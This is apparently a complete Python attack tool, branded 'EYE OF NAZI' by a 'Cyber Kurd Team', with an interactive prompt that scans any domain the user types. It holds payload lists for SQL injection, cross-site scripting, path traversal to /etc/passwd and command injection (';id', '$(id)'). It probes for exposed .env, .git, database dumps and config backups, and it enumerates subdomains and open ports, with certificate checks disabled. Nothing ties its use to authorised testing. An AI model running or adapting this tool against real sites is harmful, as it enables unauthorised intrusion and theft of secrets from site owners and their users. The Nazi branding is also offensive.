#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v49.0 - SIMPLE EDITION
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json, socket
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              SIMPLE EDITION v49.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

SQ_PAYLOADS = ["'", "\"", "'--", "1' OR '1'='1", "1' OR 1=1--",
               "1' AND 1=1--", "admin'--", "' UNION SELECT NULL--",
               "1' ORDER BY 100--", "1' AND SLEEP(3)--"]

XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "\"><script>alert(1)</script>"]

LFI_PAYLOADS = ["../../../../../../etc/passwd",
                "../../../../../../etc/hosts",
                "/etc/passwd",
                "....//....//....//etc/passwd"]

RCE_PAYLOADS = [";id", "|id", "&&id", "$(id)", ";whoami", "|whoami"]

SQL_ERRORS = ["sql syntax", "warning: mysql", "unclosed quotation",
              "odbc sql server", "postgresql", "mariadb", "sqlstate"]

LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]
RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]

SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
            'X-Content-Type-Options', 'Content-Security-Policy']

PATHS = ['.env', '.env.local', '.env.production', '.git/config',
         '.git/HEAD', '.htaccess', '.htpasswd', 'web.config',
         'wp-config.php.bak', 'wp-config.php~', 'config.php.bak',
         'backup.zip', 'backup.tar.gz', 'backup.sql', 'db.sql',
         'www.zip', 'site.zip', 'database.sql', 'dump.sql',
         'admin', 'admin/', 'admin.php', 'wp-admin/', 'wp-login.php',
         'phpmyadmin', 'pma', 'cpanel', 'webmail', 'phpinfo.php',
         'info.php', 'test.php', 'server-status', 'robots.txt',
         'sitemap.xml', 'security.txt', 'error.log', 'access.log',
         'wp-json/wp/v2/users', 'xmlrpc.php', 'readme.html',
         'api/', 'api/v1/', 'graphql', 'swagger.json',
         'uploads/', 'files/', 'tmp/', 'install/', 'setup/',
         'db.php', 'database.php', 'README.md', 'package.json',
         'composer.json', 'Dockerfile']

PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
         1433, 3306, 3389, 5432, 6379, 8080, 8443]

SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
              'blog', 'shop', 'cdn', 'static', 'app', 'portal',
              'vpn', 'git', 'webmail', 'secure', 'login']


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url, data=None, method=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 'h': dict(rp.headers),
                    't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
                    't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 'h': {}, 't': '', 'n': 0,
                    'dt': time.time() - t0, 'err': str(e)}


class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.f = []
        self.nt = 0
        self.np = 0
        self.npath = 0
        self.techs = []
        self.waf = []

    def add(self, u, p, t, pl, ev, sev):
        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
                       'evidence': ev[:200] if ev else '', 'severity': sev})
        icons = {'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
                 'XSS': '\033[43m[XSS]\033[0m',
                 'LFI': '\033[95m[LFI]\033[0m',
                 'RCE': '\033[41m\033[97m[RCE]\033[0m',
                 'SSRF': '\033[94m[SSRF]\033[0m',
                 'REDIR': '\033[96m[REDIR]\033[0m',
                 'CRLF': '\033[93m[CRLF]\033[0m',
                 'HEADER': '\033[2m[HDR]\033[0m',
                 'PATH': '\033[92m[PATH]\033[0m',
                 'PORT': '\033[93m[PORT]\033[0m',
                 'SUB': '\033[94m[SUB]\033[0m'}
        icon = icons.get(t, '[' + t + ']')
        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
        print("    URL    : " + u[:120])
        if p:
            print("    Param  : \033[93m" + p + "\033[0m")
        if pl:
            print("    Payload: " + pl[:80])
        if ev:
            print("    Proof  : " + ev[:200])

    def inject(self, url, p, pl):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[p] = [pl]
        new_q = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(
            (pr.scheme, pr.netloc, pr.path, pr.params, new_q, pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        if not q:
            return []
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())

    def scan_url(self, url):
        for p in self.params(url):
            self.np += 1
            print("  \033[2m->\033[0m \033[93m" + p + "\033[0m @ " + url[:65])
            base = self.cl.req(url)
            b = base['t'] if not base['err'] else ''
            for pl in SQ_PAYLOADS:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                found = False
                for err in SQL_ERRORS:
                    if err in r['t'].lower():
                        self.add(url, p, 'SQLI', pl, "DB err: " + err, "CRITICAL")
                        found = True
                        break
                if found:
                    break
            for pl in XSS_PAYLOADS:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                if pl in r['t']:
                    self.add(url, p, 'XSS', pl, "Reflected", "HIGH")
                    break
            for pl in LFI_PAYLOADS:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                found = False
                for ind in LFI_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'LFI', pl, "Leak: " + ind, "CRITICAL")
                        found = True
                        break
                if found:
                    break
            for pl in RCE_PAYLOADS:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                found = False
                for ind in RCE_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'RCE', pl, "Output: " + ind, "CRITICAL")
                        found = True
                        break
                if found:
                    break

    def check_headers(self, url):
        r = self.cl.req(url)
        if r['err']:
            return
        missing = []
        for h in SEC_HDRS:
            found = False
            for k in r['h']:
                if h.lower() == k.lower():
                    found = True
                    break
            if not found:
                missing.append(h)
        if missing:
            self.add(url, '', 'HEADER', '',
                     "Missing: " + ", ".join(missing), "LOW")

    def fingerprint(self, url):
        r = self.cl.req(url)
        if r['err']:
            return []
        det = []
        text_low = r['t'].lower()
        hdr_str = str(r['h']).lower()
        techs = [('WordPress', 'wp-content'), ('WordPress', 'wp-includes'),
                 ('Drupal', 'drupal'), ('Joomla', 'joomla'),
                 ('PHP', 'phpsessid'), ('nginx', 'nginx'),
                 ('Apache', 'apache'), ('Cloudflare', 'cloudflare'),
                 ('Cloudflare', 'cf-ray'), ('React', 'react'),
                 ('jQuery', 'jquery'), ('LiteSpeed', 'litespeed')]
        for name, sign in techs:
            if sign in text_low or sign in hdr_str:
                if name not in det:
                    det.append(name)
        return det

    def detect_waf(self, url):
        test_url = url.rstrip('/') + '/?x=' + urllib.parse.quote("' OR 1=1--<script>alert(1)</script>")
        r = self.cl.req(test_url)
        if r['err']:
            return []
        h_low = str(r['h']).lower()
        b_low = r['t'].lower()
        det = []
        wafs = [('Cloudflare', 'cf-ray'), ('Cloudflare', 'cloudflare'),
                ('AWS WAF', 'x-amzn-requestid'), ('Sucuri', 'x-sucuri-id'),
                ('ModSecurity', 'mod_security'), ('Wordfence', 'wordfence')]
        for name, sign in wafs:
            if sign in h_low or sign in b_low:
                if name not in det:
                    det.append(name)
        return det

    def check_path(self, base, path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        r = self.cl.req(url)
        if r['err']:
            return None
        if r['s'] in (200, 301, 302, 401, 403):
            return {'url': url, 's': r['s'], 'n': r['n'], 'path': path}
        return None

    def scan_paths(self, base):
        print("\n\033[96m[*]\033[0m Scanning " + str(len(PATHS)) + " paths...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = []
            for p in PATHS:
                futures.append(ex.submit(self.check_path, base, p))
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        self.npath += 1
                        if res['s'] == 200:
                            sev = "MEDIUM"
                            high_keys = ['.env', '.git', 'backup', 'wp-config', 'sql']
                            for x in high_keys:
                                if x in res['path']:
                                    sev = "HIGH"
                                    break
                            msg = "Status " + str(res['s']) + " - " + str(res['n']) + "B"
                            self.add(res['url'], '', 'PATH', '', msg, sev)
                        elif res['s'] in (401, 403):
                            self.add(res['url'], '', 'PATH', '',
                                     "Protected (" + str(res['s']) + ")", "INFO")
                except Exception:
                    pass

    def enum_subdomains(self, domain):
        print("\n\033[96m[*]\033[0m Subdomain Enumeration...")
        found = []
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = []
            for s in SUBDOMAINS:
                futures.append((s, ex.submit(self.cl.req, "http://" + s + "." + domain)))
            for s, fut in futures:
                try:
                    res = fut.result()
                    if not res['err'] and res['s'] in (200, 301, 302, 401, 403):
                        url = "http://" + s + "." + domain
                        found.append(url)
                        self.add(url, '', 'SUB', '',
                                 "Subdomain (" + str(res['s']) + ")", "MEDIUM")
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " subdomain(s)")

    def scan_ports(self, host):
        print("\n\033[96m[*]\033[0m Port Scanning " + host + "...")
        found = []
        for p in PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((host, p))
                s.close()
                if result == 0:
                    found.append(p)
                    self.add(host + ":" + str(p), '', 'PORT', '',
                             "Port " + str(p) + " open", "MEDIUM")
            except Exception:
                pass
        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " open port(s)")

    def run_all(self):
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")

        print("\n\033[96m[1/7]\033[0m Security Headers...")
        self.check_headers(self.url)

        print("\n\033[96m[2/7]\033[0m Fingerprinting...")
        techs = self.fingerprint(self.url)
        if techs:
            print("  \033[92m[+]\033[0m " + ", ".join(techs))
            self.techs = techs

        print("\n\033[96m[3/7]\033[0m WAF Detection...")
        waf = self.detect_waf(self.url)
        if waf:
            print("  \033[93m[!]\033[0m WAF: " + ", ".join(waf))
            self.waf = waf

        print("\n\033[96m[4/7]\033[0m URL Parameters...")
        self.nt += 1
        self.scan_url(self.url)

        print("\n\033[96m[5/7]\033[0m Sensitive Paths...")
        self.scan_paths(self.url)

        host = urllib.parse.urlparse(self.url).hostname
        if host:
            print("\n\033[96m[6/7]\033[0m Subdomains...")
            try:
                self.enum_subdomains(host)
            except Exception:
                pass

            print("\n\033[96m[7/7]\033[0m Ports...")
            try:
                self.scan_ports(host)
            except Exception:
                pass

        print("\n\033[96m" + "=" * 60 + "\033[0m")
        crit = 0
        high = 0
        med = 0
        for f in self.f:
            if f['severity'] == 'CRITICAL':
                crit += 1
            elif f['severity'] == 'HIGH':
                high += 1
            elif f['severity'] == 'MEDIUM':
                med += 1
        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
        print("    \033[43m HIGH     \033[0m " + str(high))
        print("    \033[93m MEDIUM   \033[0m " + str(med))
        print("\033[96m" + "=" * 60 + "\033[0m\n")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({'target': self.url, 'findings': self.f},
                      fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m JSON saved: " + filename)


def is_url(text):
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
        return True
    return False


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  Ready. Type a domain (e.g. kurd4u.com).\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m\n")

    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    pass
        elif cmd == 'status':
            print("\n  Cookie: " + str(st['cookie']))
            print("  Proxy: " + str(st['proxy']))
            print("  Threads: " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last'] and arg:
                st['last'].save_json(arg)
        elif is_url(cmd):
            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
            print("\n\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Start? (y/n): \033[0m").strip().lower()
            if conf not in ('y', 'yes', ''):
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Scan(url, cl, threads=st['threads'])
            try:
                sc.run_all()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
